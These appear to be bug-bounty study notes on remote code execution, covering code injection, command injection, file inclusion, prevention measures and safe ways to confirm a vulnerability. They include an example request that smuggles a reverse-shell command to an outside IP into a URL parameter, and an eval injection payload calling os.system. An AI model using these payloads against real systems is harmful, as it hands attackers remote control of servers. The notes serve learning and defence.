### Remote Code Execution
#
* Occurs when arbitrary code is executed on a target machine.
* Two strategies: **Code injection & file inclusions**
* **Code injection: happens when unsanitized data is passed into executed code.**
* Example: Python's eval() accepts strings such as "1+1" and returns 2. If it accepts user
  input, you could pass Unix or Windows commands like _import_('os').system('ls') in the GET request.
* Theres a variant called a **command injection vulnerability** which concatenates user input into a 
  system command.
      * Example in HTTP request: GET /download?url="google.com; bash -i > & /dev/tcp/10.0.0.1/8080 0>&1"
* **File inclusion** vulnerabilities are categorized into remote and local file inclusion variants.
* Remote inclusions occur when files on a remote server are include and executed. Local inclusions involve including
  files uploaded to the target machine and executing them.
### Prevention
#
* Always treat user-supplied files as untrusted
* Disallow inclusion of remote files and create an allowlist for local ones.
* Limit file types and upload them to a seperate enviroment (sandbox).
* Use API calls instead of system calls. Most programming languages allow you to run system commands without risking injection.
* Strong input validation
* Web application firewalls
* Check your dependencies
* Principle of Least Privilege
### Hunting for RCE
#
* Execute harmless commands like whoami to verify a classic RCE vulnerability.
* Execute a command like sleep 5 to change system behavior for blind variants. If you had to wait 5 seconds before a response, you've verified it.
* Gather info on tech stack and test features.
* Privilege-escalation isnt appropriate in bug bounties. You may read sensitive data, create a POC report with harmless commands.
